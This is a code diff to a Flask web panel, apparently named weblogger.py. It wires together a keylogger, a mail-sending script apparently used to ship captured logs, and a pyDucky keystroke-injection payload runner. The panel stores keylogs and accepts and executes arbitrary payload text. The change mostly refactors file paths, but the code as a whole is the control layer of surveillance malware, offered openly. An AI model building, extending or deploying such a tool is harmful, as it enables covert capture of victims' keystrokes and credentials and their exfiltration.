@@ -2,10 +2,21 @@ from flask import Flask, render_template, request, redirect, url_for
 import threading
 import subprocess
 import os
+import sys
 import time
 import datetime
+import keylogger
+import mailink
 
 app = Flask(__name__, template_folder=os.path.dirname(os.path.abspath(__file__)))
+
+# Get the directory of weblogger.py
+current_directory = os.path.dirname(os.path.realpath(__file__))
+
+# Full paths of keylogger.py and mailink.py
+keylogger_path = os.path.join(current_directory, "keylogger.py")
+mailink_path = os.path.join(current_directory, "mailink.py")
+pyDucky_path = os.path.join(current_directory, "pyDucky.py")
 
 logs_file = 'keylogs.txt'
 keylogs = []  # List to store keylogs
@@ -25,13 +36,16 @@ def payload():
     return render_template('index.html')
 
 def save_payload(payload_data):
-    if os.path.exists('payload.txt'):
-        os.remove('payload.txt')
-    with open('payload.txt', 'w') as file:
+    current_directory = os.path.dirname(os.path.realpath(sys.argv[0]))
+    payload_file_path = os.path.join(current_directory, 'payload.txt')
+    if os.path.exists(payload_file_path):
+        os.remove(payload_file_path)  # Remove existing payload.txt file
+    with open(payload_file_path, 'w') as file:
         file.write(payload_data)
 
+
 def execute_payload_script():
-    subprocess.run(['python', 'pyDucky.py'])
+    subprocess.run(['python', pyDucky_path])
 
 def format_logs(logs):
     formatted_logs = []
@@ -47,10 +61,10 @@ def format_logs(logs):
     return formatted_logs
 
 def run_mailink():
-    subprocess.run(['python', 'mailink.py'])
+    subprocess.run(['python', mailink_path])
 
 def run_keylogger():
-    subprocess.run(['python', 'keylogger.py'])
+    subprocess.run(['python', keylogger_path])
 
 def run_flask():
     app.run(host='0.0.0.0', port=5000)
